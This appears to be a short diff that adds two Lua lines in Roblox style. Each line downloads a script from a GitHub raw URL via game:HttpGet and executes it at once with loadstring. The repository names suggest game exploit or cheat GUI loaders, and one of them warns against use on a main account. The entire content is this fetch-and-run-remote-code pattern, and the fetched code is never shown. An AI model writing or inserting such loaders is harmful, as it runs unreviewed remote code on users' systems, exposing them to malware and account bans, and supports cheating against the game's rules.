@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MarcillisePex/TheDarkoneGUI/main/The%20Source"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MarcillisePex/THING/main/NEVER%20USE%20ON%20MAIN"))()
